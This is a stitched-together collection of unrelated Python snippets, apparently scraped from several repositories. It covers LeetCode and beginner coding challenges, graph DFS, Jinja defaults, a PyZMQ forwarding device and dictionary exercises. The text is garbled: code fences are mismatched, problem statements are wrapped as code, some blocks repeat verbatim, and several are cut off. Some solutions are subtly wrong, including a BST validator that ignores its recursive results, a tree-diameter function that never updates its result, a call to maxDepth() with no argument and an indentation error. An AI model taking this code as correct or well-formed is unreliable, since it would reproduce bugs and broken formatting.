    Completions are considered to be a duplicate if they result in the same
    document text when they would be applied.
    """

    def __init__(self, completer: Completer) -> None:
        self.completer = completer

    def get_completions(
        self, document: Document, complete_event: CompleteEvent
    ) -> Iterable[Completion]:
        # Keep track of the document strings we'd get after applying any completion.
        found_so_far: Set[str] = set()

        for completion in self.completer.get_completions(document, complete_event):
            text_if_applied = (
                document.text[: document.cursor_position + completion.start_position]
                + completion.text
                + document.text[document.cursor_position :]
            )

            if text_if_applied == document.text:
                # Don't include completions that don't have any effect at all.
                continue

            if text_if_applied in found_so_far:
                continue

            found_so_far.add(text_if_applied)
            yield completion

```









---


```py



def func():
    print("This func() comes from the installed " "version of nested.second.deep")

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import math


def my_abs(x):
    if not isinstance(x, (int, float)):
        raise TypeError("bad operand type")
    if x >= 0:
        return x
    else:
        return -x


def move(x, y, step, angle=0):
    nx = x + step * math.cos(angle)
    ny = y - step * math.sin(angle)
    return nx, ny


n = my_abs(-20)
print(n)

x, y = move(100, 100, 60, math.pi / 6)
print(x, y)

# TypeError: bad operand type:
my_abs("123")

# -*- coding: utf-8 -*-
from ._compat import range_type
from .filters import FILTERS as DEFAULT_FILTERS  # noqa: F401
from .tests import TESTS as DEFAULT_TESTS  # noqa: F401
from .utils import Cycler
from .utils import generate_lorem_ipsum
from .utils import Joiner
from .utils import Namespace

# defaults for the parser / lexer
BLOCK_START_STRING = "{%"
BLOCK_END_STRING = "%}"
VARIABLE_START_STRING = "{{"
VARIABLE_END_STRING = "}}"
COMMENT_START_STRING = "{#"
COMMENT_END_STRING = "#}"
LINE_STATEMENT_PREFIX = None
LINE_COMMENT_PREFIX = None
TRIM_BLOCKS = False
LSTRIP_BLOCKS = False
NEWLINE_SEQUENCE = "\n"
KEEP_TRAILING_NEWLINE = False

# default filters, tests and namespace

DEFAULT_NAMESPACE = {
    "range": range_type,
    "dict": dict,
    "lipsum": generate_lorem_ipsum,
    "cycler": Cycler,
    "joiner": Joiner,
    "namespace": Namespace,
}

# default policies
DEFAULT_POLICIES = {
    "compiler.ascii_str": True,
    "urlize.rel": "noopener",
    "urlize.target": None,
    "truncate.leeway": 5,
    "json.dumps_function": None,
    "json.dumps_kwargs": {"sort_keys": True},
    "ext.i18n.trimmed": False,
}

# Source : https://leetcode.com/problems/degree-of-an-array/description/
# Author : Fish.Yu
# Date   : 2017-12-25

import sys


class Solution:
    def findShortestSubArray(self, nums):
        """
        :type nums: List[int]
        :rtype: int
        """
        dic = {}
        degreeLen = 0

        for index, item in enumerate(nums):
            if not item in dic:
                dic[item] = {}
            obj = dic[item]
            if not "start" in obj:
                obj["start"] = index
            obj["end"] = index
            if not "count" in obj:
                obj["count"] = 1
            else:
                obj["count"] += 1
            degreeLen = max(degreeLen, obj["count"])

        ans = sys.maxsize
        for value in dic.values():
            if value["count"] != degreeLen:
                continue
            ans = min(ans, value["end"] - value["start"] + 1)

        return ans

def deleteDigit(n):
    digits = str(n)
    values = []

    for i in range(len(digits)):
        value = int(digits[:i] + digits[(i + 1) :])
        values.append(int(value))

    return max(values)
````

````py
Given a sorted linked list, delete all nodes that have duplicate numbers, leaving only distinct numbers from the original list.

Return the linked list sorted as well.```


```py


def deleteDuplicates(self, head):
    current = head
    while current:
        # case_1 if the head is duplicate
        if current.next and current.val == current.next.val:
            head = current.next.next
            while head and current.val == head.val:
                head = head.next
            current = head
        # case_2 if nodes are duplicate after the head
        elif (
            current.next
            and current.next.next
            and current.next.val == current.next.next.val
        ):
            n = current.next.next.next
            while n and current.next.val == n.val:
                n = n.next
            current.next = n
        else:
            current = current.next
    return head
````

````py
You are given an undirected graph with its maximum degree (the degree of a node
is the number of edges connected to the node).
You need to write a function that can take an undirected graph as its argument
and color the graph legally (a legal graph coloring is when no adjacent nodes
have the same color).
The number of colors necessary to complete a legal coloring is always one more
than the graph's maximum degree.
*Note: We can color a graph in linear time and space. Also, make sure that your
solution can handle a loop in a reasonable way.*```


```py
# Definition for a graph node.
class GraphNode:
    def __init__(self, label):
        self.label = label
        self.neighbors = set()
        self.color = None


def color_graph(graph, colors):
    # Your code here

    # iterate over each node of the graph
    for node in graph:
        # handle if an infinite loop is occuring
        if node in node.neighbors:
            raise Exception("impossible to find a legal solution")

        # get the node's neighbors colors
        # check if a color is illegal?
        illegal_colors = set(
            [neighbor.color for neighbor in node.neighbors if neighbor.color]
        )

        # assign the first legal color
        for color in colors:
            if color not in illegal_colors:
                node.color = color
                break
````

````py
In a town, there are `N` people labelled from `1` to `N`.  There is a rumor
that one of these people is secretly the town judge.
If the town judge exists, then:
1. The town judge trusts nobody.
2. Everybody (except for the town judge) trusts the town judge.
3. There is exactly one person that satisfies properties 1 and 2.
You are given `trust`, an array of pairs `trust[i] = [a, b]` representing that
the person labelled a trusts the person labelled `b`.
If the town judge exists and can be identified, return the label of the town
judge.  Otherwise, return `-1`.
Example 1:
```python
Input: N = 2, trust = [[1,2]]
Output: 2
````

Example 2:

```python
Input: N = 3, trust = [[1,3],[2,3]]
Output: 3
```

Example 3:

```python
Input: N = 3, trust = [[1,3],[2,3],[3,1]]
Output: -1
```

Example 4:

```python
Input: N = 3, trust = [[1,2],[2,3]]
Output: -1
```

Example 5:

```python
Input: N = 4, trust = [[1,3],[1,4],[2,3],[2,4],[4,3]]
Output: 3
```

Constraints:

- `1 <= N <= 1000`
- `0 <= trust.length <= 10^4`
- `trust[i].length == 2`
- `trust[i]` are all different
- `trust[i][0] != trust[i][1]`
- `1 <= trust[i][0], trust[i][1] <= N````

```py


def find_judge(N, trust):
    """
    Inputs:
    N -> int
    trust -> List[List[int]]
    Output:
    int
    """
    # Your code here
    # base case
    if len(trust) < N - 1:
        return -1

    indegree = [0] * (N + 1)
    outdegree = [0] * (N + 1)

    for a, b in trust:
        outdegree[a] += 1
        indegree[b] += 1

    for i in range(1, N + 1):
        if indegree[i] == N - 1 and outdegree[i] == 0:
            return i

    return -1
```

````py
Given a reference to the head node of a singly-linked list, write a function
that reverses the linked list in place. The function should return the new head
of the reversed list.
In order to do this in O(1) space (in-place), you cannot make a new list, you
need to use the existing nodes.
In order to do this in O(n) time, you should only have to traverse the list
once.
*Note: If you get stuck, try drawing a picture of a small linked list and
running your function by hand. Does it actually work? Also, don't forget to
consider edge cases (like a list with only 1 or 0 elements).*```


```py


class LinkedListNode:
    def __init__(self, value):
        self.value = value
        self.next = None


def reverse(head_of_list):
    # Your code here
    pass
````

````py
Challenge #1:

Create a function that takes two numbers as arguments and return their sum.

Examples:
- addition(3, 2) ➞ 5
- addition(-3, -6) ➞ -9
- addition(7, 3) ➞ 10```


```py


def addition(a, b):
    # Your code here
    print("i am inside the function")
    return a + b


print("this lives outside the function")
print(addition(-3, -1))
````

````py
Challenge #2:

Write a function that takes an integer `minutes` and converts it to seconds.

Examples:
- convert(5) ➞ 300
- convert(3) ➞ 180
- convert(2) ➞ 120```


```py


def convert(minutes):
    # Your code here
    seconds = minutes * 60
    return seconds


print(convert(5))
````

````py
Challenge #3:

Create a function that takes a string and returns it as an integer.

Examples:
- string_int("6") ➞ 6
- string_int("1000") ➞ 1000
- string_int("12") ➞ 12```


```py


def string_int(txt):
    # Your code here
    return int(txt)


print(string_int("1000"))
print(type(string_int("100")))
````

````py
Challenge #4:

Create a function that takes length and width and finds the perimeter of a
rectangle.

Examples:
- find_perimeter(6, 7) ➞ 26
- find_perimeter(20, 10) ➞ 60
- find_perimeter(2, 9) ➞ 22```


```py


def find_perimeter(length, width):
    # Your code here
    return 2 * length + 2 * width
````

````py
Challenge #5:

Create a function that returns a list of strings sorted by length in ascending
order.

Examples:
- sort_by_length(["a", "ccc", "dddd", "bb"]) ➞ ["a", "bb", "ccc", "dddd"]
- sort_by_length(["apple", "pie", "shortcake"]) ➞ ["pie", "apple", "shortcake"]
- sort_by_length(["may", "april", "september", "august"]) ➞ ["may", "april", "august", "september"]
- sort_by_length([]) ➞ []```


```py


def sort_by_length(lst):
    # Your code here
    # sorted_list = sorted(lst, key=lambda str_item: len(str_item))
    return sorted(lst, key=len)


print(sort_by_length(["a", "ccc", "dddd", "bb"]))

# .sort() it changes the original array
# sorted() creates a copy of the original array and changes it
````

````py
Challenge #6:

Return the number (count) of vowels in the given string.

We will consider `a, e, i, o, u as vowels for this challenge (but not y).

The input string will only consist of lower case letters and/or spaces.```


```py


def get_count(input_str):
    # Your code here
    vowel_counts = {}  # this is a dictionary to store the vowels
    for vowel in "aeiou":

        count = input_str.count(vowel)
        vowel_counts[vowel] = count
        print(vowel_counts)
        counts = vowel_counts.values()
    return sum(counts)


print(get_count("adela are mere"))
````

````py
Challenge #7:

Given an unsorted list, create a function that returns the nth smallest element
(the smallest element is the first smallest, the second smallest element is the
second smallest, etc).

Examples:
- nth_smallest([7, 5, 3, 1], 1) ➞ 1
- nth_smallest([1, 3, 5, 7], 3) ➞ 5
- nth_smallest([1, 3, 5, 7], 5) ➞ None
- nth_smallest([7, 3, 5, 1], 2) ➞ 3```


```py


def nth_smallest(lst, n):
    # Your code here
    if len(lst) >= n:
        sorted_list = sorted(lst)  # sorts the array accendetly
        return sorted_list[n - 1]


print(nth_smallest([7, 5, 3, 1], 1))
print(nth_smallest([1, 3, 5, 7], 5))
````

````py
Challenge #8:

Given an integer, write a function that returns "Even" for even integers and
"Odd" for odd integers.

Examples:
- parity(0) -> "Even"
- parity(1) -> "Odd"
- parity(2) -> "Even"```


```py


def parity(input_int):
    # Your code here
    if input_int % 2 is 0:
        return "Even"
    else:
        return "Odd"


print(parity(0))
print(parity(1))
print(parity(2))
````

````py
Challenge #9:

Given a string, write a function that returns the "middle" character of the
word.

If the word has an odd length, return the single middle character. If the word
has an even length, return the middle two characters.

Examples:
- get_middle("test") -> "es"
- get_middle("testing") -> "t"
- get_middle("middle") -> "dd"
- get_middle("A") -> "A"```


```py


def get_middle(input_str):
    # Your code here
    return input_str[(len(input_str) - 1) // 2 : (len(input_str) + 2) // 2]


print(get_middle("test"))
print(get_middle("testing"))
print(get_middle("middle"))
print(get_middle("A"))
print(get_middle("beyoudre"))
print(get_middle("you"))
````

````py
You are given a binary tree.

Write a function that can return the inorder traversal of node values.

Example:
Input:

   3
    \
     1
    /
   5

Output: [3,5,1]```


```py
# Definition for a binary tree node.
class TreeNode:
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right

def inorder_traversal(root):
    # Your code here

````

````py
Challenge #10:

Given a string of space separated integers, write a function that returns the
maximum and minimum integers.

Example:
- max_and_min("1 2 3 4 5") -> "5 1"
- max_and_min("1 2 -3 4 5") -> "5 -3"
- max_and_min("1 9 3 4 -5") -> "9 -5"

Notes:
- All inputs are valid integers.
- There will always be at least one number in the input string.
- The return string must be two numbers separated by a single space, and
the maximum number is first.```


```py

import functools
import operator


def max_and_min(input_str):
    # Your code here
    new_list = list(map(int, input_str.split()))
    new_string = str(max(new_list)) + " " + str(min(new_list))
    print(type(new_string))
    return new_string


print(max_and_min("1 2 3 4 5"))
print(max_and_min("1 2 -3 4 5"))
print(max_and_min("1 9 3 4 -5"))
````

````py
You are given a binary tree.

Write a function that can find the **maximum depth** of the binary tree. The
maximum depth can be defined as the number of nodes found along the longest
path from the root down to the furthest leaf node. Remember, a leaf node is a
node that has no children.

Example:

Given the following binary tree

    5
   / \
  12  32
     /  \
    8    4

your function should return the depth = 3.```


```py


class BinaryTreeNode:
    def __init__(self, value=0, left=None, right=None):
        self.value = value
        self.left = left
        self.right = right


def maxDepth(root):
    # Your code here
    if root.left is None and root.right is None:
        # this is a leaf so depth is just 1
        return 1
    left_depth = 0
    right_depth = 0
    if root.left:
        left_depth = maxDepth(root.left)
    if root.right:
        right_depth = maxDepth(root.right)

    # now we have left and right depth so compare them get the max
    max_child_depth = max(left_depth, right_depth)
    return max_child_depth + 1


print(maxDepth())

# uper
# go left and right
# count steps
# compare left and right maxDepth
# return max
````

````py
You are given the values from a preorder and an inorder tree traversal. Write a
function that can take those inputs and output a binary tree.

*Note: assume that there will not be any duplicates in the tree.*

Example:
Inputs:
preorder = [5,7,22,13,9]
inorder = [7,5,13,22,9]

Output:
    5
   / \
  7  22
    /  \
   13   9```


```py
# Definition for a binary tree node.
class TreeNode:
    def __init__(self, val=0, left=None, right=None):
        self.val = val
        self.left = left
        self.right = right

def build_tree(preorder, inorder):
    # Your code here

````

````py
You are given a binary tree. You need to write a function that can determin if
it is a valid binary search tree.

The rules for a valid binary search tree are:

- The node's left subtree only contains nodes with values less than the node's
value.
- The node's right subtree only contains nodes with values greater than the
node's value.
- Both the left and right subtrees must also be valid binary search trees.

Example 1:
Input:

    5
   / \
  3   7

Output: True

Example 2:
Input:

    10
   / \
  2   8
     / \
    6  12

Output: False
Explanation: The root node's value is 10 but its right child's value is 8.```


```py
# Definition for a binary tree node.
class TreeNode:
    def __init__(self, value=0, left=None, right=None):
        self.value = value
        self.left = left
        self.right = right


def is_valid_BST(root):
    # Your code here
    if root is None:
        return False
    if root.left is None and root.right is None:
        return False

    if root.left.value < root.value:
        is_valid_BST(root.left)
    if root.right.value > root.value:
        is_valid_BST(root.right)

    return True

from distutils.dep_util import newer_group


# yes, this is was almost entirely copy-pasted from
# 'newer_pairwise()', this is just another convenience
# function.
def newer_pairwise_group(sources_groups, targets):
    """Walk both arguments in parallel, testing if each source group is newer
    than its corresponding target. Returns a pair of lists (sources_groups,
    targets) where sources is newer than target, according to the semantics
    of 'newer_group()'.
    """
    if len(sources_groups) != len(targets):
        raise ValueError("'sources_group' and 'targets' must be the same length")

    # build a pair of lists (sources_groups, targets) where source is newer
    n_sources = []
    n_targets = []
    for i in range(len(sources_groups)):
        if newer_group(sources_groups[i], targets[i]):
            n_sources.append(sources_groups[i])
            n_targets.append(targets[i])

    return n_sources, n_targets

def depositProfit(deposit, rate, threshold):
    i = 0
    while deposit < threshold:
        deposit += deposit * rate * 0.01
        i += 1
    return i

def depositProfit(deposit, rate, threshold):
    years = 0
    while deposit < threshold:
        deposit += deposit * (rate / 100)
        years += 1
    return years
````

````py
This plugin installs a DEPRECATED error class for the :class:`DeprecatedTest`
exception. When :class:`DeprecatedTest` is raised, the exception will be logged
in the deprecated attribute of the result, ``D`` or ``DEPRECATED`` (verbose)
will be output, and the exception will not be counted as an error or failure.
It is enabled by default, but can be turned off by using ``--no-deprecated``.```


```py

from nose.plugins.errorclass import ErrorClass, ErrorClassPlugin


class DeprecatedTest(Exception):
    """Raise this exception to mark a test as deprecated.
    """

    pass


class Deprecated(ErrorClassPlugin):
    """
    Installs a DEPRECATED error class for the DeprecatedTest exception. Enabled
    by default.
    """

    enabled = True
    deprecated = ErrorClass(DeprecatedTest, label="DEPRECATED", isfailure=False)

    def options(self, parser, env):
        """Register commandline options.
        """
        env_opt = "NOSE_WITHOUT_DEPRECATED"
        parser.add_option(
            "--no-deprecated",
            action="store_true",
            dest="noDeprecated",
            default=env.get(env_opt, False),
            help="Disable special handling of DeprecatedTest " "exceptions.",
        )

    def configure(self, options, conf):
        """Configure plugin.
        """
        if not self.can_configure:
            return
        self.conf = conf
        disable = getattr(options, "noDeprecated", False)
        if disable:
            self.enabled = False
````

````py
Author: OMKAR PATHAK
Created On: 1st August 2017```


```py
import inspect


def search(graph, start, path=[]):
    """
    depth first search algorithm

    :param graph:
    :param start:
    :param path:
    :return:
    """
    # check if graph is empty or start vertex is none
    if start not in graph or graph[start] is None or graph[start] == []:
        return path

    path = path + [start]
    for edge in graph[start]:
        if edge not in path:
            path = search(graph, edge, path)
    return path


# TODO: Are these necessary?
def time_complexities():
    """
    Return information on functions
    time complexity
    :return: string
    """
    return "O(V + E) where V = Number of vertices and E = Number of Edges"


def get_code():
    """
    easily retrieve the source code
    of the function

    :return: source code
    """
    return inspect.getsource(search)

#!/usr/bin/python
````

```py Author: OMKAR PATHAK """


class Graph:
    def __init__(self):
        self.vertex = {}

    # for printing the Graph vertices
    def print_graph(self) -> None:
        print(self.vertex)
        for i in self.vertex:
            print(i, " -> ", " -> ".join([str(j) for j in self.vertex[i]]))

    # for adding the edge between two vertices
    def add_edge(self, from_vertex: int, to_vertex: int) -> None:
        # check if vertex is already present,
        if from_vertex in self.vertex:
            self.vertex[from_vertex].append(to_vertex)
        else:
            # else make a new vertex
            self.vertex[from_vertex] = [to_vertex]

    def dfs(self) -> None:
        # visited array for storing already visited nodes
        visited = [False] * len(self.vertex)

        # call the recursive helper function
        for i in range(len(self.vertex)):
            if not visited[i]:
                self.dfs_recursive(i, visited)

    def dfs_recursive(self, start_vertex: int, visited: list) -> None:
        # mark start vertex as visited
        visited[start_vertex] = True

        print(start_vertex, end=" ")

        # Recur for all the vertices that are adjacent to this node
        for i in self.vertex:
            if not visited[i]:
                self.dfs_recursive(i, visited)


if __name__ == "__main__":
    g = Graph()
    g.add_edge(0, 1)
    g.add_edge(0, 2)
    g.add_edge(1, 2)
    g.add_edge(2, 0)
    g.add_edge(2, 3)
    g.add_edge(3, 3)

    g.print_graph()
    print("DFS:")
    g.dfs()

    # OUTPUT:
    # 0  ->  1 -> 2
    # 1  ->  2
    # 2  ->  0 -> 3
    # 3  ->  3
    # DFS:
    #  0 1 2 3

import os

UPPERLETTERS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
LETTERS_AND_SPACE = UPPERLETTERS + UPPERLETTERS.lower() + " \t\n"


def loadDictionary():
    path = os.path.split(os.path.realpath(__file__))
    dictionaryFile = open(path[0] + "/Dictionary.txt")
    englishWords = {}
    for word in dictionaryFile.read().split("\n"):
        englishWords[word] = None
    dictionaryFile.close()
    return englishWords


ENGLISH_WORDS = loadDictionary()


def getEnglishCount(message):
    message = message.upper()
    message = removeNonLetters(message)
    possibleWords = message.split()

    if possibleWords == []:
        return 0.0

    matches = 0
    for word in possibleWords:
        if word in ENGLISH_WORDS:
            matches += 1

    return float(matches) / len(possibleWords)


def removeNonLetters(message):
    lettersOnly = []
    for symbol in message:
        if symbol in LETTERS_AND_SPACE:
            lettersOnly.append(symbol)
    return "".join(lettersOnly)


def isEnglish(message, wordPercentage=20, letterPercentage=85):
    """
    >>> isEnglish('Hello World')
    True

    >>> isEnglish('llold HorWd')
    False
    """
    wordsMatch = getEnglishCount(message) * 100 >= wordPercentage
    numLetters = len(removeNonLetters(message))
    messageLettersPercentage = (float(numLetters) / len(message)) * 100
    lettersMatch = messageLettersPercentage >= letterPercentage
    return wordsMatch and lettersMatch


import doctest

doctest.testmod()

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

import zmq
from zmq.green import Poller


def device(device_type, isocket, osocket):
    """Start a zeromq device (gevent-compatible).

    Unlike the true zmq.device, this does not release the GIL.

    Parameters
    ----------
    device_type : (QUEUE, FORWARDER, STREAMER)
        The type of device to start (ignored).
    isocket : Socket
        The Socket instance for the incoming traffic.
    osocket : Socket
        The Socket instance for the outbound traffic.
    """
    p = Poller()
    if osocket == -1:
        osocket = isocket
    p.register(isocket, zmq.POLLIN)
    p.register(osocket, zmq.POLLIN)

    while True:
        events = dict(p.poll())
        if isocket in events:
            osocket.send_multipart(isocket.recv_multipart())
        if osocket in events:
            isocket.send_multipart(osocket.recv_multipart())

# list input devices


class InputDevice:
    def __init__(self):
        self.name = ""
        self.handler = ""

    def __str__(self):
        return "<Input Device: name=%s, handler=%s>" % (self.name, self.handler)

    def setName(self, name):
        if len(name) >= 2 and name.startswith('"') and name.endswith('"'):
            name = name[1 : len(name) - 1]
        self.name = name

    def setHandler(self, handlers):
        for handler in handlers.split(" "):
            if handler.startswith("event"):
                self.handler = handler


def listDevices():
    devices = []
    with open("/proc/bus/input/devices", "r") as f:
        device = None
        while True:
            s = f.readline()
            if s == "":
                break
            s = s.strip()
            if s == "":
                devices.append(device)
                device = None
            else:
                if device is None:
                    device = InputDevice()
                if s.startswith("N: Name="):
                    device.setName(s[8:])
                elif s.startswith("H: Handlers="):
                    device.setHandler(s[12:])
    return devices


def detectJoystick(joystickNames):
    for device in listDevices():
        for joystickName in joystickNames:
            if joystickName in device.name:
                return "/dev/input/%s" % device.handler
    return None
```

````py
ID: 0ff2f1b7-0112-4990-8897-b05c2cdbcbca```


```py

from collections.abc import Iterable, Mapping, Set

from src.typehints import Node


def dfs_component_dict(graph: Mapping[Node, Set[Node]], start: Node) -> Iterable[Node]:
    """Find all the nodes connected to the starting node, using DFS on a dict."""
    component = {start}
    to_visit = [start]
    while to_visit:
        node = to_visit.pop()
        new_nodes = graph[node] - component
        to_visit.extend(new_nodes)
        component |= new_nodes
        yield node
````

````py
ID: 0ff2f1b7-0112-4990-8897-b05c2cdbcbca```


```py

from collections.abc import Iterable, Mapping, Set

from src.typehints import Node


def dfs_component_dict(graph: Mapping[Node, Set[Node]], start: Node) -> Iterable[Node]:
    """Find all the nodes connected to the starting node, using DFS on a dict."""
    component = {start}
    to_visit = [start]
    while to_visit:
        node = to_visit.pop()
        new_nodes = graph[node] - component
        to_visit.extend(new_nodes)
        component |= new_nodes
        yield node
````

````py
ID: 0ff2f1b7-0112-4990-8897-b05c2cdbcbca```


```py

from collections.abc import Iterable, Mapping, Set

from src.typehints import Node


def dfs_component_dict(graph: Mapping[Node, Set[Node]], start: Node) -> Iterable[Node]:
    """Find all the nodes connected to the starting node, using DFS on a dict."""
    component = {start}
    to_visit = [start]
    while to_visit:
        node = to_visit.pop()
        new_nodes = graph[node] - component
        to_visit.extend(new_nodes)
        component |= new_nodes
        yield node
````

````py
ID: 88bad34a-271e-4096-9036-6bda1cbd4fc0
https://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/```


```py
from collections.abc import Mapping, Set
from typing import Optional

from src.typehints import Node


def dfs_component_dict_recur(
    graph: Mapping[Node, Set[Node]], start: Node, component: Optional[Set[Node]] = None
) -> set[Node]:
    """Recursively find all the nodes connected to start."""
    if component is None:
        component = set()
    component.add(start)
    for new_node in graph[start] - component:
        dfs_component_dict_recur(graph, new_node, component)
    return component
````

````py
ID: 88bad34a-271e-4096-9036-6bda1cbd4fc0
https://eddmann.com/posts/depth-first-search-and-breadth-first-search-in-python/```


```py
from collections.abc import Mapping, Set
from typing import Optional

from src.typehints import Node


def dfs_component_dict_recur(
    graph: Mapping[Node, Set[Node]], start: Node, component: Optional[Set[Node]] = None
) -> set[Node]:
    """Recursively find all the nodes connected to start."""
    if component is None:
        component = set()
    component.add(start)
    for new_node in graph[start] - component:
        dfs_component_dict_recur(graph, new_node, component)
    return component
````

````py
ID: ba4cc08e-3863-4e99-ab10-24cdf75c93a0```


```py
from collections.abc import Iterable, Sequence


def dfs_components_grid(
    grid: Sequence[Sequence[int]]
) -> Iterable[set[tuple[int, int]]]:
    """On a grid of 0s and 1s, find all the components of 1s."""
    unseen = {(r, c) for r, row in enumerate(grid) for c, n in enumerate(row) if n}
    while unseen:
        start = unseen.pop()
        component = {start}
        to_visit = [start]
        while to_visit:
            r, c = to_visit.pop()
            adjacent = {(r + 1, c), (r - 1, c), (r, c + 1), (r, c - 1)}
            next_nodes = adjacent & unseen
            to_visit.extend(next_nodes)
            component |= next_nodes
            unseen -= next_nodes
        yield component
````

````py
ID: 3df740e0-34f3-4852-add2-7076c8be47c3```


```py
from collections.abc import Iterable, Mapping
from typing import Optional

from src.typehints import Node


def dfs_paths_dict_recur(
    graph: Mapping[Node, set[Node]],
    start: Node,
    goal: Node,
    path: Optional[list[Node]] = None,
) -> Iterable[list[Node]]:
    """Find all the paths from start to goal recursively on a dict."""
    if path is None:
        path = [start]
    if start == goal:
        yield path
    else:
        for next_node in graph[start].difference(path):
            next_path = path + [next_node]
            yield from dfs_paths_dict_recur(graph, next_node, goal, next_path)

diameter = 0


def diameterOfBinaryTree(root):
    find_height(root, diameter)
    return diameter


def find_height(root, diameter):
    if root == None:
        return 0
    if root.left == None and root.right == None:
        return 1
    l_height = find_height(root.left, diameter)
    r_height = find_height(root.right, diameter)
    total = l_height + r_height
    if total > diameter:
        diameter = total
    return 1 + max(l_height, r_height)

#!/usr/bin/env python3
# -*- coding: utf-8 -*-


class Dict(dict):
    """
    Simple dict but also support access as x.y style.

    >>> d1 = Dict()
    >>> d1['x'] = 100
    >>> d1.x
    100
    >>> d1.y = 200
    >>> d1['y']
    200
    >>> d2 = Dict(a=1, b=2, c='3')
    >>> d2.c
    '3'
    >>> d2['empty']
    Traceback (most recent call last):
        ...
    KeyError: 'empty'
    >>> d2.empty
    Traceback (most recent call last):
        ...
    AttributeError: 'Dict' object has no attribute 'empty'
    """

    def __init__(self, **kw):
        super(Dict, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value


if __name__ == "__main__":
    import doctest

    doctest.testmod()

import sqlite3


def dict_factory(cursor, row):
    d = {}
    for idx, col in enumerate(cursor.description):
        d[col[0]] = row[idx]
    return d


# after dbcon
con.row_factory = dict_factory
cur = con.cursor()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import unittest


class Dict(dict):
    def __init__(self, **kw):
        super(Dict, self).__init__(**kw)

    def __getattr__(self, key):
        try:
            return self[key]
        except KeyError:
            raise AttributeError(r"'Dict' object has no attribute '%s'" % key)

    def __setattr__(self, key, value):
        self[key] = value


class TestDict(unittest.TestCase):
    def setUp(self):
        print("setUp...")

    def tearDown(self):
        print("tearDown...")

    def test_init(self):
        d = Dict(a=1, b="test")
        self.assertEqual(d.a, 1)
        self.assertEqual(d.b, "test")
        self.assertTrue(isinstance(d, dict))

    def test_key(self):
        d = Dict()
        d["key"] = "value"
        self.assertEqual(d.key, "value")

    def test_attr(self):
        d = Dict()
        d.key = "value"
        self.assertTrue("key" in d)
        self.assertEqual(d["key"], "value")

    def test_keyerror(self):
        d = Dict()
        with self.assertRaises(KeyError):
            value = d["empty"]

    def test_attrerror(self):
        d = Dict()
        with self.assertRaises(AttributeError):
            value = d.empty


if __name__ == "__main__":
    unittest.main()
````

````py
Dictionaries are Python's implementation of associative arrays.
There's not much different with Python's version compared to what
you'll find in other languages (though you can also initialize and
populate dictionaries using comprehensions just like you can with
lists!).
The docs can be found here:
https://docs.python.org/3/tutorial/datastructures.html#dictionaries
For this exercise, you have a list of dictionaries. Each dictionary
has the following keys:
 - lat: a signed integer representing a latitude value
 - lon: a signed integer representing a longitude value
 - name: a name string for this location```


```py

waypoints = [
    {"lat": 43, "lon": -121, "name": "a place"},
    {"lat": 41, "lon": -123, "name": "another place"},
    {"lat": 43, "lon": -122, "name": "a third place"},
]

# Add a new waypoint to the list
# YOUR CODE HERE
waypoints.append({"lat": 120, "lon": -11, "name": "yat anothe place"})

# Modify the dictionary with name "a place" such that its longitude
# value is -130 and change its name to "not a real place"
# Note: It's okay to access the dictionary using bracket notation on the
# waypoints list.

# YOUR CODE HERE
# d = {
#         "lat": 43,
#         "lon": -121,
#         "name": "a place"
#     }

# d["lon"] =
waypoints[0]["lon"] = -130
waypoints[0]["name"] = "not a real place"


# Write a loop that prints out all the field values for all the waypoints
# YOUR CODE HERE

# dict = data structiors that alow us to store key value pairs

phonebook = {"ADela": 832723, "Tyler": 28362}

if "Herb" in phonebook:
    print("Yes")
else:
    print("no")

phonebook["Herb"] = 6783512873
phonebook["ADela"] = 2222222

del phonebook["Tyler"]

print(phonebook.keys())

for k in phonebook.keys():
    print(k)

print(phonebook.items())
print(phonebook.values())

for key, value in phonebook.items():
    print(key)
    print(value)

#####################################################################
#
# The essence of this practice is to create this data structure here:
#
d = {"Sam": 7, "rolls": ["rock", "paper", "scissors"], "done": True}

#####################################################################
#
# This is unchanged from the instructions,
# sans formatting and display of output of expected.
# \t means tab in Python strings.
#

print(d["Sam"], "\t\t\t\t\t\t\t\t# <- outputs 7?")
print(d["rolls"], "\t# <- outputs ['rock', 'paper', 'scissors']?")
print(d.get("Sarah"), "\t\t\t\t\t\t\t# <- outputs None?")
print(d.get("Jeff", -1), "\t\t\t\t\t\t\t\t# <- outputs -1?")
print(d["done"], "\t\t\t\t\t\t\t# <- outputs True?")

####################################################################
# Output when running this:
#
# 7         # <- outputs 7?
# ['rock', 'paper', 'scissors']  # <- outputs ['rock', 'paper', 'scissors']?
# None            # <- outputs None?
# -1         # <- outputs -1?
# True            # <- outputs True?

# Make an array of dictionaries. Each dictionary should have keys:
#
# lat: the latitude
# lon: the longitude
# name: the waypoint name
#
# Make up three entries of various values.

waypoints = [
    {"lat": 43, "lon": -121, "name": "a place"},
    {"lat": 41, "lon": -123, "name": "another place"},
    {"lat": 43, "lon": -122, "name": "a third place"},
]

# Write a loop that prints out all the field values for all the waypoints
for waypoint in waypoints:
    print(waypoint["lat"], waypoint["lon"], waypoint["name"])

# Add a new waypoint to the list
waypoints.append({"lat": 225, "lon": -400, "name": "number 4 the larch, the larch"})

# We assume that the input always be find_difference_matching(list, list, integer)
def find_difference_matching(x, y, diff=0):
    res = []
    for i in range(len(x)):
        if abs(x[i] - y[i]) == diff:
            res.append((x[i], y[i]))
    return res


# Test
a = [12, 10, 123, 76, 9990]
b = [2, 0, 45, 66, 10000]
result = find_difference_matching(a, b, 10)
print("Matches:")
for i in result:
    print("   " + str(i))

def differentSquares(matrix):
 """
 Return number of DIFFERENT 2 * 2 squares in rectangular matrix.

    Time Complexity: O(N^2)
    Space Complexity: O(N)
 """
    squares = set()
    for i in range(len(matrix) - 1):
        for j in range(len(matrix[i]) - 1):
            squares.add((matrix[i][j], matrix[i][j + 1], matrix[i + 1][j], matrix[i + 1][j + 1]))
    return len(squares)
from typing import Optional


def find_primitive(n: int) -> Optional[int]:
    for r in range(1, n):
        li = []
        for x in range(n - 1):
            val = pow(r, x, n)
            if val in li:
                break
            li.append(val)
        else:
            return r
    return None


if __name__ == "__main__":
    q = int(input("Enter a prime number q: "))
